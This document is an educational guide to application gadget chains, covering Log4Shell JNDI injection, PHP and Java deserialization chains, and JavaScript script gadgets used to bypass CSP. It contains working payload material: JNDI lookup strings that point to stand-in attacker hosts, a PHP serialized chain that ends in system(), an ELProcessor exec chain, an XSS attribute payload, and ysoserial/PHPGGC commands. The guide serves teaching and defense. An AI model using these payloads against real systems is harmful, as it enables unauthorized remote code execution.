# Application Gadget Chains & JNDI Injection

A practical guide for understanding Application-Level Gadget Chains—specifically regarding Deserialization, JNDI Injection (Log4Shell), and Logic Chains—where attackers misuse valid, existing classes to perform malicious actions.

> **Note:** This guide focuses on **Object/Class Gadgets** (Java/PHP/JS). For assembly-level gadgets (ROP/JOP) used in memory corruption, see *Memory Corruption guides*.

## Table of Contents

- [Overview](#overview)
- [The Fundamental Pattern](#the-fundamental-pattern)
- [JNDI Injection (Log4Shell)](#jndi-injection-log4shell)
  - [The Concept](#the-concept)
  - [The Remote Class Loading Attack](#the-remote-class-loading-attack)
  - [The Local Factory Gadget Chain](#the-local-factory-gadget-chain)
- [Deserialization Gadget Chains](#deserialization-gadget-chains)
  - [Anatomy of a Chain](#anatomy-of-a-chain)
  - [The "Trampoline" Concept](#the-trampoline-concept)
- [Client-Side Gadgets](#client-side-gadgets)
- [Pattern Recognition: Finding Gadgets](#pattern-recognition-finding-gadgets)
- [Tools & Methodology](#tools--methodology)
- [Legal & Ethical Considerations](#legal--ethical-considerations)

---

## Overview

In secure programming, strict definitions prevent data from being executed as code. However, large applications contain thousands of classes (the "Classpath").

A **Gadget** is a piece of existing code (a class, a method, a function) that does something useful (writes a file, starts a process, connects to a network).
A **Gadget Chain** is a sequence of these existing snippets linked together to pass data from a malicious input (Source) to a dangerous execution (Sink).

Critically, **you are not writing new code**; you are reusing the application's own code against it. It is "Living off the Land" inside the application runtime.

### Foundational Examples

| CVE | Product | Mechanism | Impact |
|-----|---------|----------|--------|
| CVE-2021-44228 | Log4j (Log4Shell) | JNDI Injection | RCE via LDAP reference |
| CVE-2015-4852 | Apache Commons | Java Deserialization | RCE via Transformer chain |
| CVE-2019-11043 | PHP-FPM | PHP Gadgets | RCE via env var corruption |
| - | jQuery / Angular | JS Gadgets | XSS via existing library logic |

---

## The Fundamental Pattern

The "Rube Goldberg Machine" analogy is perfect here. You push a domino, which hits a ball, which turns a gear, which finally pulls the trigger.

```
THE GADGET CHAIN ANATOMY:

1. THE KICKOFF (Magic Method / Entry Point)
   Attacker controls an object. The system automatically calls a method on it.
   Examples: 
     - Java: readObject()
     - PHP: __destruct() / __wakeup()
     - JNDI: lookup()

            │  (Calls next method)
            ▼

2. THE TRAMPOLINE (Intermediate Gadgets)
   Code that connects the entry point to the destination.
   It transforms the data or calling context.
   Examples:
     - Map.get() triggers hashCode()
     - toString() triggers string processing
     - InvocationHandler.invoke()

            │  (Calls next method)
            ▼

3. THE SINK (Dangerous Execution)
   The final method that performs the action.
   Examples:
     - Runtime.exec() (Java)
     - system() (PHP)
     - javax.naming.Context.lookup() (JNDI)
```

---

## JNDI Injection (Log4Shell)

Log4Shell is the ultimate example of a Gadget/Feature abuse. It bridges string parsing into full Remote Code Execution via JNDI (Java Naming and Directory Interface).

### The Concept

JNDI is a standard Java API (like a phonebook) for finding resources (Database drivers, LDAP entries) by name.
Log4j supported "Lookups"—special strings that get evaluated.

**The Trigger:** `${jndi:ldap://attacker.com/exploit}`

### The Remote Class Loading Attack

When JNDI looks up an LDAP resource, the LDAP server can respond with a `Reference` object saying: *"I don't have the data, but here is a specific Java Class that knows how to handle it. Download it from this URL."*

1.  **Vulnerable App:** Logs `${jndi:ldap://evil.com/X}`.
2.  **JNDI Context:** Connects to `evil.com`.
3.  **Attacker LDAP:** Returns `Reference` to `Exploit.class` hosted at `http://evil.com/Exploit.class`.
4.  **Vulnerable App:**
    *   Sees the Reference.
    *   **Downloads** `Exploit.class`.
    *   **Instantiates** it (`new Exploit()`).
    *   **Executes** code in the constructor/static block.

*This works if `com.sun.jndi.ldap.object.trustURLCodebase` is `true`. Modern Java disables this by default.*

### The Local Factory Gadget Chain

If remote downloading is blocked (the modern scenario), attackers use **Local Gadgets**.
Instead of telling the server to "Download X," the LDAP response says:
*"Use the `javax.naming.spi.ObjectFactory` class named `org.apache.naming.factory.BeanFactory` which is already on your CLASSPATH."*

**The Chain:**
1.  **Entry:** JNDI Lookup.
2.  **Gadget (`BeanFactory`)**: A Tomcat class designed to create objects via reflection.
    *   It takes `Reference` data (attacker controlled).
    *   It looks for a `forceString` property.
    *   It calls `method.invoke()` on a class of your choice.
3.  **Sink:** The attacker tells `BeanFactory` to create a `javax.el.ELProcessor` and call `eval()`.
    *   `eval("Runtime.getRuntime().exec('calc')")`

**Result:** RCE without downloading any external classes, just by chaining `JNDI` -> `BeanFactory` -> `ELProcessor`.

---

## Deserialization Gadget Chains

While JNDI is about specific lookup features, Deserialization chains rely on object reconstruction.

### Anatomy of a Chain (PHP Example)

Let's look at a PHP chain (often simpler to visualise than Java).

```php
// 1. ENTRY POINT (The Kickoff)
class LogFile {
    public $filename;
    // __destruct is called automatically when script ends
    function __destruct() {
        // Calls a method on another object stored in $this->filename
        echo $this->filename; 
    }
}

// 2. THE TRAMPOLINE
class User {
    public $username;
    // __toString is called when object is treated as a string (via echo above)
    function __toString() {
        return $this->username->getValue(); 
    }
}

// 3. THE SINK
class Cache {
    public $cmd;
    function getValue() {
        system($this->cmd); // RCE
    }
}

// ATTACKER PAYLOAD SETUP:
$a = new Cache();
$a->cmd = "whoami";

$b = new User();
$b->username = $a;

$c = new LogFile();
$c->filename = $b;

echo serialize($c);
// Result: O:7:"LogFile":1:{...}
```

When this blob is deserialized:
1.  Script ends -> `LogFile.__destruct()`
2.  `echo $filename` -> `User.__toString()`
3.  `$username->getValue()` -> `Cache.getValue()`
4.  `system("whoami")`

### The "Trampoline" Concept

In complex Java chains (like Commons Collections), you often need to move from a `readObject` (which accepts no arguments) to a method that accepts an argument (to pass your command).

*   **Maps/Sets** are great trampolines.
*   Putting an object in a `HashMap` calls `obj.hashCode()`.
*   Implementing `InvocationHandler` (Java Proxy) allows intercepting *any* method call.

---

## Client-Side Gadgets

Gadget chains aren't just for backends. "Script Gadgets" exist in JavaScript libraries (jQuery, Angular, Vue).

**Scenario:**
You have a Cross-Site Scripting (XSS) filter that blocks `<script>` tags and `on*` events.
But the site uses a library that parses HTML data attributes.

**The Gadget:**
Some frontend framework code looks like:
```javascript
// Valid library code
var buttons = document.querySelectorAll('[data-role="button"]');
buttons.forEach(btn => {
    var action = btn.getAttribute('data-action');
    eval(action); // <--- THE SINK
});
```

**The Chain:**
The attacker executes:
1.  Inject HTML: `<div data-role="button" data-action="alert(1)"></div>`
2.  (Wait for library to run).
3.  Library finds the div.
4.  Library calls `eval("alert(1)")`.
5.  XSS achieved without writing `<script>`.

This is vital for bypassing **CSP (Content Security Policy)**. If CSP allows `unsafe-eval` (often required by frameworks) but blocks inline scripts, you use a library gadget to bridge the gap.

---

## Pattern Recognition: Finding Gadgets

How do researchers find these?

### 1. Identify Magic Methods (Sources)
*   **Java**: `readObject`, `readResolve`, `finalize`.
*   **PHP**: `__destruct`, `__wakeup`, `__toString`, `__call`.
*   **Python**: `__reduce__`.
*   **JS**: `valueOf`, `toString`.

### 2. Identify Generic Invokers (Trampolines)
Look for code that handles generic types (`Object`, `interface`) rather than specific classes.
*   `method.invoke()` (Reflection).
*   `expression.getValue()` (Expression Languages).
*   `callable.call()`.

### 3. Identify Sinks
*   `Runtime.exec`, `ProcessBuilder`.
*   `FileOutputStream` (Write files).
*   `Context.lookup` (JNDI).
*   `Unsafe.allocateMemory` (Memory corruption).

### 4. CodeQL & Static Analysis
Modern hunters use CodeQL queries to find paths:
`from source(readObject) -> ... -> sink(exec)`

---

## Tools & Methodology

### ysoserial (The Bible of Java Gadgets)
A tool that generates serialized blobs for known gadget chains.
*   Usage: `java -jar ysoserial.jar CommonsCollections4 "calc.exe"`
*   Study the source code of `ysoserial` to understand *how* the chains work.

### PHPGGC (PHP Generic Gadget Chains)
The equivalent for PHP. 
*   `phpggc Laravel/RCE1 system id`

### JNDI-Exploit-Kit
Tools to spin up malicious LDAP/RMI servers that host the specific bytecode or serialized gadgets needed to exploit Log4j-style bugs.

### Gadget Inspector
Automated static analysis tools that crawl JAR files to build call graphs (Source -> Sink discovery).

---

## Legal & Ethical Considerations

### Do
*   Use gadget chains to demonstrate impact (e.g., popping Calc or `id`) in authorized assessments.
*   Understand that different Java versions block different chains.

### Don't
*   Use this for ransomware entry (Log4Shell was heavily abused for this).
*   Deploy persistent backdoors using gadget chains on production systems.

---

*Document Version: 2.0 (AppSec Focus)*
*Last Updated: January 2026*
